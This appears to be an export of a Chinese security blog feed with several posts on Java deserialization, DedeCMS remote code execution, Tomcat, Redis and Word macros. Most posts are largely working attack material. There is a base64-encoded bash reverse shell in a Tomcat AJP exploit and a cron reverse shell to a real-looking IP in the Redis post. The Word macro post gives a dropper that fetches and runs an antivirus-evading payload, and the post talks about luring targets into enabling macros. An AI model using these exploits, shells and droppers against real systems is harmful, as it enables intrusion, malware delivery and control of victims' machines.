<pre><code class="language-plain">package org.example;

import java.lang.reflect.Method;

public class ReflectionTest01 {
    public static void main(String[] args) throws Exception{
        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
        Method method = c1.getMethod(&quot;exec&quot;, String.class);
        Method RuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);
        Object o1 = RuntimeMethod.invoke(c1);
        method.invoke(o1, &quot;deepin-calculator&quot;);
    }
}
</code></pre>
<p>写到一句话</p>
<pre><code class="language-plain">package org.example;

import java.lang.reflect.Method;

public class ReflectionTest01 {
    public static void main(String[] args) throws Exception{
        /*Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
        Method method = c1.getMethod(&quot;exec&quot;, String.class);
        Method RuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);
        Object o1 = RuntimeMethod.invoke(c1);
        method.invoke(o1, &quot;deepin-calculator&quot;);*/
      	//执行命令
        Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;deepin-calculator&quot;);
    }
}
</code></pre>
<h2 id="java执行命令的三种方式">JAVA执行命令的三种方式</h2>
<h3 id="0x01-调用-runtime-类进行命令执行">0x01 调用 Runtime 类进行命令执行</h3>
<h3 id="0x02-processbuilder">0x02 ProcessBuilder</h3>
<h3 id="0x03-使用-processimpl">0x03 使用 ProcessImpl</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JAVA序列化与反序列化]]></title>
        <id>https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/</id>
        <link href="https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/">
        </link>
        <updated>2022-03-03T03:09:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="概述">概述</h1>
<p>大概意思：</p>
<pre><code class="language-c">序列化：对象 -&gt; 字符串
反序列化：字符串 -&gt; 对象
</code></pre>
<h1 id="几种创建的序列化和反序列化协议">几种创建的序列化和反序列化协议</h1>
<ul>
<li>XML&amp;SOAP</li>
<li>JSON</li>
<li>Protobuf</li>
</ul>
<h1 id="序列化与反序列化基本实现">序列化与反序列化基本实现</h1>
<p>将序列化功能封装进了 <strong>serialize</strong> 这个方法里面，在序列化当中，我们通过这个 FileOutputStream 输出流对象，将序列化的对象输出到 ser.bin 当中。再调用 oos 的 writeObject 方法，将对象进行序列化操作。</p>
<h2 id="serialization"><strong>Serialization</strong></h2>
<pre><code class="language-java">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
oos.writeObject(obj);
</code></pre>
<h2 id="unserialize"><strong>Unserialize</strong></h2>
<pre><code class="language-java">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
Object obj = ois.readObject();
</code></pre>
<h1 id="序列化的安全问题">序列化的安全问题</h1>
<h2 id="重要函数">重要函数</h2>
<p>writeObject 和 readObject</p>
<h2 id="存在安全漏洞的形式">存在安全漏洞的形式</h2>
<h3 id="0x01-入口类的-readobject-直接调用危险方法">0x01 入口类的 readObject 直接调用危险方法</h3>
<h3 id="0x02-入口参数中包含可控类该类有危险方法readobject-时调用">0x02 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3>
<h3 id="0x03-入口类参数中包含可控类该类又调用其他有危险方法的类readobject-时调用">0x03 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</h3>
<h3 id="0x04-构造函数静态代码块等类加载时隐式执行">0x04 构造函数/静态代码块等类加载时隐式执行</h3>
<h2 id="漏洞的攻击路线">漏洞的攻击路线</h2>
<p>首先的攻击前提：继承 Serializable</p>
<p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
<p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p>
<p>执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数</p>
<h1 id="urldns-分析">URLDNS 分析</h1>
<p>urldns 地址</p>
<p>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</p>
<p>利用链</p>
<pre><code class="language-java">Gadget Chain:     
    HashMap.readObject()         
    	HashMap.putVal()             
    		HashMap.hash()                 
    			URL.hashCode()
</code></pre>
<p>先看 Hashmap 的readobject方法</p>
<pre><code class="language-java">//还有一堆省略了
for (int i = 0; i &lt; mappings; i++) {
    @SuppressWarnings(&quot;unchecked&quot;)
        K key = (K) s.readObject();
    @SuppressWarnings(&quot;unchecked&quot;)
        V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
</code></pre>
<p>跟进hash函数</p>
<pre><code class="language-plain">static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
}
</code></pre>
<p>这里使用的是key.hashcode。于是需要寻找key来源。</p>
<p>在POC里面URL需要使用hashmap.put()方法，</p>
<pre><code class="language-java">hashmap.put(new URL(&quot;DNS地址以&quot;),1);
</code></pre>
<p>跟进put方法。</p>
<pre><code class="language-plain">public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
</code></pre>
<p>发现调用了hash函数，hash里面的key便是传的URL参数。</p>
<p>跟进URL里面查找hashcode().</p>
<pre><code class="language-java">public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
</code></pre>
<p>继续跟进handler。</p>
<pre><code class="language-java">transient URLStreamHandler handler;
</code></pre>
<p>继续跟进URLStreamHandler，寻找hashcode。</p>
<pre><code class="language-java">protected int hashCode(URL u) {
    int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
    h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
if (addr != null) {
    h += addr.hashCode();
} else {
    String host = u.getHost();
    if (host != null)
        h += host.toLowerCase().hashCode();
}
</code></pre>
<p>继续跟进hostAddress()</p>
<pre><code class="language-plain">protected InetAddress getHostAddress(URL u) {
    return u.getHostAddress();
}
</code></pre>
<p>继续跟进</p>
<pre><code class="language-plain">synchronized InetAddress getHostAddress() {
    if (hostAddress != null) {
        return hostAddress;
    }

    if (host == null || host.isEmpty()) {
        return null;
    }
    try {
        hostAddress = InetAddress.getByName(host);
    } catch (UnknownHostException | SecurityException ex) {
        return null;
    }
    return hostAddress;
}
</code></pre>
<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
<h2 id="利用链">利用链</h2>
<ol>
<li>HashMap-&gt;readObject()</li>
<li>HashMap-&gt;hash()</li>
<li>URL-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;getHostAddress()</li>
<li>InetAddress-&gt;getByName()</li>
</ol>
<h2 id="urldns-反序列化利用链的-poc">URLDNS 反序列化利用链的 POC</h2>
<pre><code class="language-plain">package org.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL; import java.util.HashMap;
public class URLDNS {
    public static void main(String[] args) throws Exception {
        // new一个 HashMap 出来，这是此 gadget 的起点；
        // 然后设置需要访问的url
        HashMap hashMap = new HashMap();
        URL url = new URL(&quot;http://aer4rt.dnslog.cn&quot;);
        // 将私有的 hashCode 设置为可以更改
        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        field.setAccessible(true);
        // 设置 url 对象内的 hashCode 为 0x123
        field.set(url, 0x123);
        // 将键值存入hashMap
        hashMap.put(url, &quot;qqq&quot;);
        // 设置 url 对象内的 hashCode 为 -1（不可更改）
        field.set(url, -1);
        // 序列化，写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./out.ser&quot;));
        outputStream.writeObject(hashMap);
        outputStream.close();
        // 反序列化，读取文件
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.ser&quot;));
        inputStream.readObject();
        inputStream.close();
    }
}
</code></pre>
<h2 id="注意">注意</h2>
<p>我们需要注意hashmap中的put方法。</p>
<pre><code class="language-java">public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
</code></pre>
<p>在URL对象再初始化之后的hashCode默认为-1。也就是说生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p>
<p>注释field.set(url, 0x123);发现默认为-1</p>
<p><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/image.png" alt="img" loading="lazy"><br>
这时候hashCode默认为-1，然后就会进入hash(key)触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p>
<p>而在put了之后，需要field.set(url, -1);把这个字段修改回来，去触发DNS请求。</p>
<h2 id="查看yso做法">查看yso做法</h2>
<pre><code class="language-java">public class URLDNS implements ObjectPayload&lt;Object&gt; { 
    public Object getObject(final String url) throws Exception { 
        //Avoid DNS resolution during payload creation 
        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. 
        URLStreamHandler handler = new SilentURLStreamHandler(); 
        HashMap ht = new HashMap(); 
        // HashMap that will contain the URL 
        URL u = new URL(null, url, handler); // URL to use as the Key 
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. 
        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. 
        return ht; 
    } 
    public static void main(final String[] args) throws Exception { 
        PayloadRunner.run(URLDNS.class, args); 
    } 
    static class SilentURLStreamHandler extends URLStreamHandler { 
        protected URLConnection openConnection(URL u) throws IOException { 
            return null; 
        } 
        protected synchronized InetAddress getHostAddress(URL u) { 
            return null; 
        } 
    } 
}
</code></pre>
<p>它代码中没有使用 field.set(url, 0x123); ，但是自定了一个类为 SilentURLStreamHandler，这个类重写了getHostAddress() 函数，重写后的 getHostAddress() 是个空的，也就导致在本地生成 poc 的时候不会有 DNS 请求。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Springboot 学习]]></title>
        <id>https://www.yyxyy.xyz/post/springboot-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/springboot-xue-xi/">
        </link>
        <updated>2022-02-19T07:02:49.000Z</updated>
        <content type="html"><![CDATA[<p>环境<br>
● jdk1.8<br>
● maven 3.6.1<br>
● springboot 2.7.8<br>
● IDEA 2022<br>
HelloWorld程序<br>
0x01 idea快速配置springboot<br>
0x02 起步依赖</p>
<pre><code class="language-java">&lt;parent&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
    &lt;version&gt;2.7.8&lt;/version&gt;
    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
&lt;/parent&gt;


&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>0x03 启动引导类</p>
<pre><code class="language-java">@SpringBootApplication
    public class DemoApplication {

        public static void main(String[] args) {
            SpringApplication.run(DemoApplication.class, args);
        }

    }
</code></pre>
<p>0x04 业务类</p>
<pre><code class="language-java">@RestController
    public class HelloController {
        @RequestMapping(&quot;/hello&quot;)
        public String hello(){
            return &quot;hello&quot;;
        }
    }
</code></pre>
<p>配置文件<br>
0x01 application.properties配置格式<br>
1 properties</p>
<pre><code class="language-yaml">server.port=8080
</code></pre>
<p>2 yml</p>
<pre><code class="language-yaml">server:
    port: 8080
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DeDe远程代码执行分析&复现]]></title>
        <id>https://www.yyxyy.xyz/post/dede-yuan-cheng-dai-ma-zhi-xing-fen-xi-andfu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/dede-yuan-cheng-dai-ma-zhi-xing-fen-xi-andfu-xian/">
        </link>
        <updated>2021-10-09T09:09:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-安装dedecms">0x01 安装dedecms</h1>
<p>dedecms安装链接:</p>
<pre><code class="language-html">https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1
</code></pre>
<h1 id="0x02-漏洞分析">0x02 漏洞分析</h1>
<p>1.plus/flink.php脚本内部</p>
<pre><code class="language-php">if ($dopost == 'save') {
    $validate = isset($validate) ? strtolower(trim($validate)) : '';
    $svali = GetCkVdValue();
    if ($validate == '' || $validate != $svali) {
        ShowMsg('验证码不正确!', '-1');
        exit();
    }
}
</code></pre>
<p>这里调用了ShowMsg(),跟进这个函数</p>
<p>2.include/common.func.php</p>
<pre><code class="language-php">function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0)
{
​    if (empty($GLOBALS['cfg_plus_dir'])) {
​        $GLOBALS['cfg_plus_dir'] = '..';
​    }
​    if ($gourl == -1) {
​        $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
​        if ($gourl == &quot;&quot;) {
​            $gourl = -1;
​        }
​    }
    ...............................................................
        
​    $tpl = new DedeTemplate();
​    $tpl-&gt;LoadString($msg);
​    $tpl-&gt;Display();
}
</code></pre>
<p>首先当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>l</mi><mo>=</mo><mo>−</mo><mn>1</mn><mi mathvariant="normal">时</mi><mi mathvariant="normal">，</mi><mi>H</mi><mi>T</mi><mi>T</mi><msub><mi>P</mi><mi>R</mi></msub><mi>E</mi><mi>F</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>R</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">续</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">在</mi><mi>L</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">gourl=-1时，HTTP_REFERER时可控的，后续会在LoadString(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">续</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span></span></span></span>msg)加载，在Display()调用解析。</p>
<p>3.include/dedetemplate.class.php</p>
<pre><code class="language-php">public function LoadString($str = '')
{
    $this-&gt;sourceString = $str;
    $hashcode = md5($this-&gt;sourceString);
    $this-&gt;cacheFile = $this-&gt;cacheDir . &quot;/string_&quot; . $hashcode . &quot;.inc&quot;;
    $this-&gt;configFile = $this-&gt;cacheDir . &quot;/string_&quot; . $hashcode . &quot;_config.inc&quot;;
    $this-&gt;ParseTemplate();
}

</code></pre>
<pre><code class="language-php">public function Display()
{
    global $gtmpfile;
    extract($GLOBALS, EXTR_SKIP);
    $this-&gt;WriteCache();
    include $this-&gt;cacheFile;
}
</code></pre>
<p><code>sourceString</code>设置与攻击者控制的<code>$msg</code>会在writeCache被调用。</p>
<p>跟进WriteCache()</p>
<pre><code class="language-php">public function WriteCache($ctype = 'all')
​    {
​        if (!file_exists($this-&gt;cacheFile) || $this-&gt;isCache == false
​            || (file_exists($this-&gt;templateFile) &amp;&amp; (filemtime($this-&gt;templateFile) &gt; filemtime($this-&gt;cacheFile)))
​        ) {
​            if (!$this-&gt;isParse) {
​                $this-&gt;ParseTemplate();
​            }
​            $fp = fopen($this-&gt;cacheFile, 'w') or dir(&quot;Write Cache File Error! &quot;);
​            flock($fp, 3);
​            $result = trim($this-&gt;GetResult());
​            $errmsg = '';
​            //var_dump($result);exit();
​            if (!$this-&gt;CheckDisabledFunctions($result, $errmsg)) {
​                fclose($fp);
​                @unlink($this-&gt;cacheFile);
​                die($errmsg);
​         }
​     fwrite($fp, $result);
​     fclose($fp);
    .........
}
</code></pre>
<pre><code class="language-php">public function GetResult()
{
​    if (!$this-&gt;isParse) {
​        $this-&gt;ParseTemplate();
​    }
​    $addset = '';
​    $addset .= '&lt;' . '?php' . &quot;\r\n&quot; . 'if(!isset($GLOBALS[\'_vars\'])) $GLOBALS[\'_vars\'] = array(); ' . &quot;\r\n&quot; . '$fields = array();' . &quot;\r\n&quot; . '?' . '&gt;';
​    return preg_replace(&quot;/\?&quot; . &quot;&gt;[ \r\n\t]{0,}&lt;&quot; . &quot;\?php/&quot;, &quot;&quot;, $addset . $this-&gt;sourceString);
}
</code></pre>
<p>调用<code>GetResult</code>返回值<code>sourceString</code>来设置<code>$result</code>变量，该变量现在包含攻击者控制的输入。然后在<code>CheckDisabledFunctions</code>函数在<code>$result</code>变量上被调用</p>
<pre><code class="language-php">public function CheckDisabledFunctions($str, &amp;$errmsg = '')
{
    global $cfg_disable_funs;
    $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite';
// 模板引擎增加disable_functions
    if (!defined('DEDEDISFUN')) {
        $tokens = token_get_all_nl($str);
        $disabled_functions = explode(',', $cfg_disable_funs);
        foreach ($tokens as $token) {
            if (is_array($token)) {
                if ($token[0] = '306' &amp;&amp; in_array($token[1], $disabled_functions)) {
                    $errmsg = 'DedeCMS Error:function disabled &quot;' . $token[1] . '&quot; &lt;a href=&quot;http://help.dedecms.com/install-use/apply/2013/0711/2324.html&quot; target=&quot;_blank&quot;&gt;more...&lt;/a&gt;';
                    return false;
                }
            }
        }
    }
    return true;
}
</code></pre>
<p>GetResult()方法执行后返回结果通过CheckDisabledFunctions过滤，然后经过include $this-&gt;cacheFile;</p>
<p>到这儿就可以通过控制 Referer请求头，来控制模版的渲染，绕过 CheckDisabledFunctions()方法的过滤 造成远程命令执行</p>
<p>通过正则找到受影响且无需身份认证的文件，来进行命令执行</p>
<ol>
<li><code>/plus/flink.php?dopost=save</code></li>
<li><code>/plus/users_products.php?oid=1337</code></li>
<li><code>/plus/download.php?aid=1337</code></li>
<li><code>/plus/showphoto.php?aid=1337</code></li>
<li><code>/plus/users-do.php?fmdo=sendMail</code></li>
<li><code>/plus/posttocar.php?id=1337</code></li>
<li><code>/plus/vote.php?dopost=view</code></li>
<li><code>/plus/carbuyaction.php?do=clickout</code></li>
<li><code>/plus/recommend.php</code></li>
<li>…</li>
</ol>
<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
<p>这里我发现没有禁止反引号，就直接拿反引号执行命令</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/web/1633766116159.png" alt="1633766116159" loading="lazy"></figure>
<h1 id="0x04-参考链接">0x04 参考链接</h1>
<p>https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[tomcat漏洞总结]]></title>
        <id>https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/</id>
        <link href="https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/">
        </link>
        <updated>2021-08-30T02:12:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-cve-2017-12615">0x01 CVE-2017-12615</h1>
<p>CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本</p>
<p>流程：</p>
<p>抓包，修改为put请求就行。</p>
<pre><code class="language-sql">PUT /test.txt HTTP/1.1

testpoc
</code></pre>
<p>响应包为201表示成功</p>
<p>同理可以上传冰蝎马这些东西</p>
<p>上传这里可能会404，所以需要绕过</p>
<pre><code class="language-powershell">1.Windows下不允许文件以空格结尾
以PUT /test.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格

2.Windows NTFS流
Put/test.jsp::$DATA HTTP/1.1

3./在文件名中是非法的，也会被去除（Linux/Windows）
Put/test.jsp/ Http:/1.1

</code></pre>
<h1 id="0x02-cve-2020-1938">0x02 CVE-2020-1938</h1>
<p>漏洞复现</p>
<p>我复现了一下，感觉这个洞比较鸡肋</p>
<p>首先寻找poc</p>
<pre><code class="language-shell">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境

查看文件
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml

反弹shell
生成一个test.txt
&lt;%
    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);
%&gt;
然后想办法把txt传入服务器。
监听端口
使用poc反弹shell
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.180.139 -p 8009 -f test.txt

也可以使用msf，这里就不细说了，反正感觉有点鸡肋

</code></pre>
<h1 id="0x03-cve-2019-0232">0x03 CVE-2019-0232</h1>
<p>2333</p>
<h1 id="0x04-弱口令war包部署">0x04  弱口令＋war包部署</h1>
<p>这个洞是tomcat最好用的</p>
<h1 id="0x05-暴力破解">0x05 暴力破解</h1>
<p>可以使用msf的模块 ：auxiliary/scanner/http/tomcat_mgr_login</p>
<p>也可以使用burp抓包</p>
<p>参考链接：https://xz.aliyun.com/t/10083#toc-10</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[word宏免杀]]></title>
        <id>https://www.yyxyy.xyz/post/word-hong-mian-sha/</id>
        <link href="https://www.yyxyy.xyz/post/word-hong-mian-sha/">
        </link>
        <updated>2021-08-25T07:02:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1>
<p>仅仅是为了娱乐。</p>
<h1 id="知识点">知识点</h1>
<ol>
<li>宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀</li>
<li>csharp 可执行js ,反序列化加载</li>
</ol>
<p>具体的原理：</p>
<p>利用宏调用Dlllnstall api</p>
<pre><code class="language-vbscript">Private Declare PtrSafe Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long

Sub AutoOpen()
        DllInstall False, ByVal StrPtr(&quot;ip/y.sct&quot;) ' False = &quot;Don't install&quot;
End Sub
</code></pre>
<h1 id="后续操作">后续操作</h1>
<h2 id="0x01-远程部署一个sct">0x01 远程部署一个sct</h2>
<p>例如：弹个计算器</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
  progid=&quot;TESTING&quot;
  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
  &lt;script language=&quot;JScript&quot;&gt;
    &lt;![CDATA[
var foo = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
    ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<p>后续只需要使用word宏远程加载这个sct文件就成。</p>
<h2 id="0x02-免杀">0x02 免杀</h2>
<p>操作和前面一样。</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
    progid=&quot;ShortJSRAT&quot;
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
    &lt;!-- Learn from Casey Smith @subTee --&gt;
    &lt;script language=&quot;JScript&quot;&gt;
        &lt;![CDATA[
            var WSHShell = new ActiveXObject(&quot;WScript.Shell&quot;);
            path = WSHShell.ExpandEnvironmentStrings(&quot;%temp%&quot;);
            var filepath = path+&quot;/explorer.exe&quot;;
            var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
            xhr.open(&quot;GET&quot;,&quot;免杀马&quot;, false);
            xhr.send();
            if (xhr.Status == 200) {
                var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
                var stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
                stream.Open();
                stream.Type = 1;
                stream.Write(xhr.ResponseBody);
                stream.Position = 0;
                if (fso.FileExists(filepath)){
                   fso.DeleteFile(filepath);
                }
                stream.SaveToFile(filepath);
                stream.Close();
                new ActiveXObject(&quot;WScript.Shell&quot;).Exec(filepath);
            }
 
 
        ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<h2 id="0x03-对word的一些处理">0x03 对word的一些处理</h2>
<p>后续会思考如何才能让目标打开宏，怎么样才能更加逼真</p>
<h1 id="0x04-总结">0x04 总结</h1>
<p>感谢愿意陪我玩的朋友。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bapass/1.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redis未授权利用及思考]]></title>
        <id>https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/</id>
        <link href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
        </link>
        <updated>2021-08-23T14:02:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
</code></pre>
<h2 id="0x02-写web目录">0x02 写web目录</h2>
<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
config set dbfilename test.php
set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
save
</code></pre>
<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
redis执行
config set dir /root/.ssh
config set dbfilename authorized_keys
save
</code></pre>
<h2 id="0x04-主从复制">0x04 主从复制</h2>
<p>https://github.com/vulhub/redis-rogue-getshell</p>
<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
<h2 id="网上常见的方法">网上常见的方法</h2>
<p>1.web目录写马</p>
<p>2.写启动项</p>
<p>https://www.bilibili.com/read/cv7358287/</p>
